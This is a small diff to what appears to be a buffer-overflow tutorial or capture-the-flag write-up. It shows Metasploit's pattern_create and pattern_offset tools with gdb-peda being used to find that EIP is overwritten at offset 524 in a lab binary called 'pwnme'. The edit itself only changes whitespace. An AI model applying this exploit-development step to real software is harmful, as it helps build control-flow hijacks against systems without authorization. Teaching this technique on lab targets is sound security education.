@@ -40,8 +40,8 @@ We will override ```EIP``` at ```offset 524```.
 $ /usr/share/metasploit-framework/tools/pattern_create.rb 999 > /tmp/in
 $ gdb ~/pwnme -q
 gdb-peda$ r < /tmp/in
-...
 Stopped reason: SIGSEGV 0x35724134 in ?? ()
+
 $ /usr/share/metasploit-framework/tools/pattern_offset.rb 0x35724134
 [*] Exact match at offset 524
 ```
